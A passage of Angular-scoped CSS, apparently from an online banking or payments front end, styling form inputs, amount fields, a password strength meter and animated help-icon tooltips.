            word-break: break-word;
            vertical-align: middle;
            padding-top: 0
        }

        .broome-field[_ngcontent-c22] {
            width: 100%;
            height: 28px;
            line-height: 28px;
            padding-right: 5px;
            color: #666;
            background-color: transparent;
            border: 0;
            margin-top: 0;
            text-align: right;
            font-size: 14px
        }

        .broome-field[_ngcontent-c22]:focus {
            outline-width: 0
        }

        .broome-field.broome-field-has-text[_ngcontent-c22] {
            font-size: 25px;
            color: #333
        }

        .broome-field-error[_ngcontent-c22] {
            margin-top: 8px;
            clear: both;
            float: right
        }

        .venecia-main-box.amountMode[_ngcontent-c22] {
            text-align: right
        }

        .venecia-main-box.amountMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            width: calc(100% - 60px);
            display: inline-block
        }

        .venecia-main-box.amountMode.servicePaymentDisplayMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: none
        }

        .venecia-main-box.amountMode.servicePaymentDisplayMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            position: relative;
            left: auto;
            max-width: 160px;
            display: block
        }

        .venecia-main-box.amountMode.servicePaymentDisplayMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field[_ngcontent-c22] {
            border: 1px solid #999;
            width: 160px
        }

        .venecia-main-box.amountMode.servicePaymentDisplayMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field.disabled[_ngcontent-c22] {
            border: 1px solid #bbb
        }

        .venecia-main-box.amountMode.servicePaymentDisplayMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field.broome-field-has-text[_ngcontent-c22] {
            font-size: 14px;
            color: #666
        }

        .venecia-main-box.thirdPartyProductsAdminItemMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: none
        }

        .venecia-main-box.thirdPartyProductsAdminItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            position: relative;
            left: auto;
            max-width: 160px;
            display: block
        }

        .venecia-main-box.thirdPartyProductsAdminItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field[_ngcontent-c22] {
            border: 1px solid #999;
            width: 160px
        }

        .venecia-main-box.thirdPartyProductsAdminItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field.disabled[_ngcontent-c22] {
            border: 1px solid #bbb
        }

        .venecia-main-box.thirdPartyProductsAdminItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field.broome-field-has-text[_ngcontent-c22] {
            font-size: 14px;
            color: #666
        }

        .venecia-main-box.thirdPartyProductsSelectionItemMode[_ngcontent-c22] {
            float: right
        }

        .venecia-main-box.thirdPartyProductsSelectionItemMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: none
        }

        .venecia-main-box.thirdPartyProductsSelectionItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            position: static;
            left: auto;
            display: inline-block;
            width: 100%;
            max-width: 120px
        }

        .venecia-main-box.thirdPartyProductsSelectionItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field[_ngcontent-c22] {
            border: 1px solid #999;
            width: 100%
        }

        .venecia-main-box.thirdPartyProductsSelectionItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field.disabled[_ngcontent-c22] {
            border: 1px solid #bbb
        }

        .venecia-main-box.thirdPartyProductsSelectionItemMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .broome-field.broome-field-has-text[_ngcontent-c22] {
            font-size: 14px;
            color: #666
        }

        .venecia-main-box.borderBottom[_ngcontent-c22] input[_ngcontent-c22] {
            width: 50px;
            height: 26px;
            margin-right: 10px;
            margin-top: -5px;
            background: 0 0;
            border: none;
            border-bottom: 1px solid #bbb;
            outline: 0;
            text-align: center;
            vertical-align: bottom
        }

        .venecia-main-box.splitRowAmountMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: auto
        }

        .venecia-main-box.splitRowAmountMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
            display: inline-block
        }

        .venecia-main-box.borderBottom[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22]:focus {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .venecia-main-box.borderBottom.filledMode.inlineMode[_ngcontent-c22] {
            display: inline-block;
            vertical-align: top
        }

        .venecia-main-box.borderBottom.filledMode[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            border-left: 0 !important;
            color: #0097c1;
            width: 36px
        }

        .venecia-main-box.borderBottom.filledMode[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22]:focus {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .venecia-main-box.borderBottom.filledMode[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22] {
            display: inline-block;
            vertical-align: top;
            padding-top: 2px;
            margin-right: 10px
        }

        .venecia-main-box.borderBottom.notificationMode[_ngcontent-c22] input.valid[_ngcontent-c22] {
            border-left: 0 !important;
            text-align: right;
            font-size: 18px
        }

        .venecia-main-box.twoLines[_ngcontent-c22] {
            padding-top: 8px;
            width: 80%
        }

        .venecia-main-box.twoLines.modalPresentationMode[_ngcontent-c22] {
            width: 100%
        }

        .venecia-main-box.twoLines[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            position: relative;
            width: 100%;
            display: block;
            padding: 0
        }

        .venecia-main-box.twoLines[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] input[_ngcontent-c22] {
            width: 100%
        }

        .venecia-main-box.twoLines[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            font-size: 12px
        }

        .venecia-main-box.twoLines[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            min-height: 0;
            padding: 0
        }

        .venecia-main-box.wrappedContentForm[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: block;
            min-height: 0
        }

        .venecia-main-box.wrappedContentForm[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            display: block;
            font-size: 12px;
            color: #666
        }

        .venecia-main-box.wrappedContentForm[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
            display: block;
            line-height: 18px;
            min-height: 0
        }

        .venecia-main-box.wrappedContentForm.marginContentFormContextual[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22],
        .venecia-main-box.wrappedContentForm.marginContentFormContextual[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
            padding-left: 6px
        }

        .venecia-main-box.fullSizeContentForm[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            display: block
        }

        .venecia-main-box.fullSizeContentForm[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] input[_ngcontent-c22] {
            width: 100%
        }

        .venecia-main-box.fullSizeContentForm.configurationByScopeMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            display: block
        }

        .venecia-main-box.fullSizeContentForm.configurationByScopeMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] input[_ngcontent-c22] {
            width: 100%
        }

        .venecia-main-form-content.confirmationMode[_ngcontent-c22] .venecia-main-form-input.xsmall[_ngcontent-c22] {
            width: 48px;
            margin-right: 20px
        }

        .venecia-main-box[_ngcontent-c22] .confirmationMode[_ngcontent-c22] {
            display: block
        }

        .venecia-password[_ngcontent-c22] {
            cursor: pointer;
            -webkit-appearance: none;
            -moz-appearance: none;
            outline: 0;
            display: inline-block;
            vertical-align: middle;
            padding: 0 0 0 8px;
            color: #0097c1
        }

        .disabled[_ngcontent-c22] {
            opacity: .6;
            pointer-events: none
        }

        .venecia-main-box.formLayoutMode.secretQuestionMode[_ngcontent-c22] .venecia-main-form-label-parent.form-break-label[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: auto;
            padding-right: 8px
        }

        @media only screen and (min-width:1366px) {
            .broome-field.broome-field-has-text.broome-field-long-text[_ngcontent-c22] {
                font-size: 25px
            }

            .broome-field.broome-field-has-text.broome-field-very-long-text[_ngcontent-c22] {
                font-size: 20px
            }
        }

        @media only screen and (max-width:1365px) and (min-width:1024px) {
            .broome-field.broome-field-has-text.broome-field-long-text[_ngcontent-c22] {
                font-size: 20px
            }

            .broome-field.broome-field-has-text.broome-field-very-long-text[_ngcontent-c22] {
                font-size: 14px
            }
        }

        @media only screen and (min-width:1024px) {
            .venecia-main-box.amountSelectorMode[_ngcontent-c22] .broome-field.broome-field-has-text.broome-field-long-text[_ngcontent-c22] {
                font-size: 16px
            }

            .venecia-main-box.amountSelectorMode[_ngcontent-c22] .broome-field.broome-field-has-text.broome-field-very-long-text[_ngcontent-c22] {
                font-size: 14px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .venecia-main-box.twoLines[_ngcontent-c22] {
                width: auto
            }

            .roma_basic_content_row[_ngcontent-c22] {
                padding: 0 0 10px
            }

            .roma_basic_content_row_label[_ngcontent-c22] {
                font-size: 12px;
                font-family: dinRegular
            }
        }

        @media only screen and (min-width:640px) {
            .venecia-main-form-label-data[_ngcontent-c22] {
                line-height: 30px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .venecia-main-box.amountSelectorMode[_ngcontent-c22] .broome-field.broome-field-has-text.broome-field-long-text[_ngcontent-c22] {
                font-size: 16px
            }

            .venecia-main-box.amountSelectorMode[_ngcontent-c22] .broome-field.broome-field-has-text.broome-field-very-long-text[_ngcontent-c22] {
                font-size: 14px
            }

            .venecia-main-form-content[_ngcontent-c22] {
                width: 100%;
                display: block;
                position: relative
            }

            .venecia-main-form-input[_ngcontent-c22] {
                width: 100%;
                display: block
            }

            .venecia-main-box.borderBottom.filledMode[_ngcontent-c22] {
                padding-bottom: 0
            }

            .venecia-main-box.borderBottom.filledMode[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
                margin-top: -24px;
                margin-left: 10px
            }
        }

        input[class^=ios].broome-field[_ngcontent-c22]:-moz-placeholder,
        input[class^=ios].broome-field[_ngcontent-c22]:-ms-input-placeholder,
        input[class^=ios].broome-field[_ngcontent-c22]:-webkit-input-placeholder,
        input[class^=ios].broome-field[_ngcontent-c22]::-moz-placeholder {
            font-size: 20px
        }

        input[class^=ios].broome-field.broome-field-has-text[_ngcontent-c22] {
            font-size: 20px
        }

        .backoffice [_nghost-c22] .venecia-main-box[_ngcontent-c22] .venecia-main-form-input.xxxsmall[_ngcontent-c22] {
            width: 55px
        }

        input[type=number][_ngcontent-c22] {
            -moz-appearance: textfield
        }

        .password_with_strength_meter_text[_ngcontent-c22] {
            height: 22px;
            width: 78%;
            margin-top: 5px;
            margin-bottom: 0
        }

        .password_with_strength_meter_bar[_ngcontent-c22] {
            height: 5px;
            width: 215px;
            background: #f5f5f5;
            margin-bottom: 12px
        }

        .venecia-verylow[_ngcontent-c22] {
            background: #fdadad;
            width: 33px;
            height: 5px
        }

        .venecia-low[_ngcontent-c22] {
            background-color: #fdd5ad;
            width: 72px;
            height: 5px
        }

        .venecia-medium[_ngcontent-c22] {
            background-color: #feda78;
            width: 142px;
            height: 5px
        }

        .venecia-high[_ngcontent-c22] {
            background-color: #b9eba6;
            width: 215px;
            height: 5px
        }

        .password-label[_ngcontent-c22] {
            font-size: 12px;
            color: #666;
            width: 200px
        }

        .password_with_strength_meter_text[_ngcontent-c22] .password-label-dark[_ngcontent-c22] {
            color: #333
        }

        input[type=checkbox].venecia-view-pass[_ngcontent-c22] {
            cursor: pointer;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            outline: 0;
            display: inline-block;
            vertical-align: middle;
            padding: 0 0 0 8px
        }

        input[type=checkbox].venecia-view-pass[_ngcontent-c22]:after {
            padding-right: 3px;
            top: 1px;
            font-family: streamline !important;
            font-style: normal;
            font-weight: 400;
            font-size: 20px;
            content: "";
            color: #0097c1;
            display: block
        }

        input[type=checkbox].venecia-view-pass[_ngcontent-c22]:checked:after {
            content: "";
            color: #0097c1
        }

        .venecia-main-box[_ngcontent-c22] {
            padding-bottom: 4px
        }

        .venecia-main-box.oneLine[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            width: 50%
        }

        .venecia-main-box.oneLine[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            display: inline-block;
            padding-top: 10px;
            font-size: 14px;
            color: #555
        }

        .venecia-main-box.oneLine[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            width: 50%;
            text-align: right;
            padding-right: 6px
        }

        .venecia-main-box.oneLine[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] input[_ngcontent-c22] {
            width: 100%;
            border-left: none;
            border-right: none;
            border-top: none;
            text-align: right;
            background: 0 0;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .venecia-main-box.oneLine[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] input[_ngcontent-c22]:disabled {
            opacity: .5
        }

        .venecia-main-box.additionalInformationFormMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            padding-left: 0
        }

        .venecia-main-box.extraFinancialInputMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: block
        }

        .venecia-main-box.extraFinancialInputMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            font-size: 16px;
            width: auto;
            color: #333
        }

        .venecia-main-box.extraFinancialInputMode[_ngcontent-c22] .venecia-main-form-content.venecia-position[_ngcontent-c22] {
            display: block
        }

        .venecia-main-box.extraFinancialInputMode[_ngcontent-c22] .venecia-main-form-content.venecia-position[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            width: 100%;
            border-left: 0 !important;
            border-top: 0;
            border-right: 0;
            font-size: 26px;
            text-align: right;
            border-bottom: 1px solid #bbb;
            color: #333;
            padding-bottom: 4px
        }

        .venecia-main-box.extraFinancialInputMode[_ngcontent-c22] .venecia-main-form-content.venecia-position[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22]:focus {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .venecia-main-form-content[_ngcontent-c22] input.broome-field[_ngcontent-c22] {
            font-size: 16px
        }

        .venecia-main-box.customPymentFormMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22],
        .venecia-main-box.customPymentFormMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            width: 100%
        }

        .venecia-main-box.officialReceiptTotalMode[_ngcontent-c22] .venecia-main-form-label-data.form-break-data[_ngcontent-c22],
        .venecia-main-box.officialReceiptTotalMode[_ngcontent-c22] .venecia-main-form-label.form-break-label[_ngcontent-c22] {
            font-family: dinMedium
        }

        .venecia-main-box.twoLines.transferInputLenghtMode.dacadebtorsfieldfirstCellMode[_ngcontent-c22] {
            width: 100%
        }

        .venecia-main-box.twoLines.transferInputLenghtMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: auto;
            padding-top: 8px
        }

        .venecia-main-box.twoLines.transferInputLenghtMode[_ngcontent-c22] .venecia-main-form-label-contextual[_ngcontent-c22] {
            display: inline-block;
            vertical-align: top;
            padding-top: 3px
        }

        .venecia-main-box.twoLines.additionalInfoStepMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: auto
        }

        .venecia-main-box.amountMode.creditPaymentDetailMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error.broome-field-error[_ngcontent-c22] {
            white-space: nowrap
        }

        .venecia-main-form-label-contextual-description[_ngcontent-c22] {
            font-size: 12px
        }

        @media screen and (max-width:1023px) and (min-width:768px) {
            .venecia-main-box.twoLines.transferInputLenghtMode[_ngcontent-c22] {
                width: auto
            }
        }
    </style>
<style>
        .tokyo_icon[_ngcontent-c28] {
            font-size: 18px;
            padding: 6px 6px 6px 3px;
            cursor: pointer;
            position: relative
        }

        .tokyo_icon.preregisteredMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.preregisteredMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.addHocMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.addHocMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.debtRowMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.debtRowMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.singleOnlineDebtMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.singleOnlineDebtMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 9px;
            left: -2px;
            -webkit-animation: .1s belek-animatedSingleDebt;
            animation: .1s belek-animatedSingleDebt;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.textHelpMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.textHelpMode[_ngcontent-c28] .linkTextResource[_ngcontent-c28] {
            color: #0097c1;
            font-size: 12px;
            display: inline-block
        }

        .tokyo_icon.textHelpMode[_ngcontent-c28] .linkTextResource[_ngcontent-c28]:hover {
            color: #005b75
        }

        .tokyo_icon.textHelpMode[_ngcontent-c28] .linkTextResource[_ngcontent-c28]+i[_ngcontent-c28] {
            font-size: 12px
        }

        .tokyo_icon.textHelpMode[_ngcontent-c28]:hover .linkTextResource[_ngcontent-c28] {
            color: #005b75
        }

        .tokyo_icon.textHelpMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 10px;
            left: -1px;
            -webkit-animation: .1s belek-animatedHelpTextbox;
            animation: .1s belek-animatedHelpTextbox;
            height: 20px;
            width: 60px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 10px;
            left: 0;
            -webkit-animation: .1s belek-animatedServiceSubscription;
            animation: .1s belek-animatedServiceSubscription;
            height: 20px;
            width: 21px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c28] i[_ngcontent-c28] {
            font-size: 14px
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 10px;
            left: -1px;
            -webkit-animation: .1s belek-animatedAccountDetail;
            animation: .1s belek-animatedAccountDetail;
            height: 19px;
            width: 22px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c28] i[_ngcontent-c28] {
            font-size: 14px
        }

        .tokyo_icon.simpleRowContextualInfoMode[_ngcontent-c28] {
            vertical-align: middle;
            font-size: 12px
        }

        .tokyo_main.simpleRowContextualInfoMode[_ngcontent-c28] {
            text-align: left;
            white-space: normal
        }

        @-webkit-keyframes belek-animatedAccountDetail {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 22px;
                top: 10px;
                left: -1px;
                height: 19px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedAccountDetail {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 22px;
                top: 10px;
                left: -1px;
                height: 19px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedServiceSubscription {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 21px;
                top: 10px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedServiceSubscription {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 21px;
                top: 10px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedSingleDebt {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 9px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedSingleDebt {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 9px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedPreRegistered {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedPreRegistered {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedHelpTextbox {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 60px;
                top: 10px;
                left: -1px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedHelpTextbox {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 60px;
                top: 10px;
                left: -1px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .stream-help[_ngcontent-c28],
        .stream-view-2[_ngcontent-c28] {
            vertical-align: middle;
            font-size: 16px
        }

        .tokyo_content[_ngcontent-c28] {
            padding: 10px 15px;
            color: #333
        }

        .tokyo_loader[_ngcontent-c28] {
            overflow: hidden;
            min-height: 200px;
            height: 200px;
            margin-top: -20px
        }

        .tokyo_item[_ngcontent-c28] {
            display: table;
            padding: 3px 0
        }

        .tokyo_item_key[_ngcontent-c28] {
            display: table-cell;
            font-size: 12px;
            white-space: nowrap;
            padding-right: 6px
        }

        .tokyo_item_key[_ngcontent-c28]:after {
            content: ":"
        }

        .tokyo_item_value[_ngcontent-c28] {
            display: table-cell;
            font-size: 12px
        }

        .tokyo_header[_ngcontent-c28] {
            color: #333
        }

        .tokyo_header[_ngcontent-c28]:empty {
            display: none
        }

        .tokyo_content[_ngcontent-c28] .tokyo_item_key[_ngcontent-c28] {
            color: #666
        }

        .tokyo_content[_ngcontent-c28] .tokyo_item_value[_ngcontent-c28] {
            color: #4d4d4d
        }

        .tokyo_header.dark[_ngcontent-c28] {
            color: #f8f8f8
        }

        .tokyo_content.dark[_ngcontent-c28] {
            color: #f8f8f8;
            white-space: normal;
            font-size: 12px
        }

        .tokyo_content.dark[_ngcontent-c28] .tokyo_item_key[_ngcontent-c28] {
            color: #ccc
        }

        .tokyo_content.dark[_ngcontent-c28] .tokyo_item_value[_ngcontent-c28] {
            color: #e6e6e6
        }

        .tokyo_icon[_ngcontent-c28] i[_ngcontent-c28] {
            color: #0097c1;
            font-size: 16px
        }

        .tokyo_icon[_ngcontent-c28]:hover i[_ngcontent-c28] {
            color: #005b75;
            position: relative;
            z-index: 1
        }

        .tokyo_icon[_ngcontent-c28] i[_ngcontent-c28]:focus {
            outline: 0
        }

        .tokyo_icon[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            -webkit-animation: .1s belek-animated;
            animation: .1s belek-animated;
            height: 20px;
            top: 2px;
            left: 0;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes belek-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .belek-background[_ngcontent-c28] {
            position: absolute;
            width: 7px;
            top: 8px;
            left: 9px;
            height: 8px;
            background: 0 0;
            -webkit-animation: .1s belek-animated-reverse;
            animation: .1s belek-animated-reverse;
            border-radius: 2px
        }

        @-webkit-keyframes belek-animated-reverse {
            0% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse {
            0% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        .tokyo_icon[_ngcontent-c28] i.stream-help-circle[_ngcontent-c28]+.belek-background[_ngcontent-c28] {
            -webkit-animation: .1s belek-animated-reverse2;
            animation: .1s belek-animated-reverse2;
            width: 7px;
            top: 8px;
            left: 14px;
            height: 6px;
            background: 0 0;
            border-radius: 2px
        }

        .tokyo_icon[_ngcontent-c28]:hover i.stream-help-circle[_ngcontent-c28]+.belek-background[_ngcontent-c28] {
            -webkit-animation: .1s belek-animated2;
            animation: .1s belek-animated2;
            height: 24px;
            top: 6px;
            left: -2px;
            width: 24px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes belek-animated2 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated2 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-reverse2 {
            0% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse2 {
            0% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @-webkit-keyframes belek-animated3 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated3 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-reverse3 {
            0% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse3 {
            0% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        .backoffice [_nghost-c28] .tokyo_icon[_ngcontent-c28] i[_ngcontent-c28] {
            color: #ff4800;
            font-size: 14px
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c28] {
            cursor: default
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c28] i.stream-help-circle[_ngcontent-c28]+.belek-background[_ngcontent-c28] {
            width: 7px;
            top: 8px;
            left: 9px;
            height: 8px;
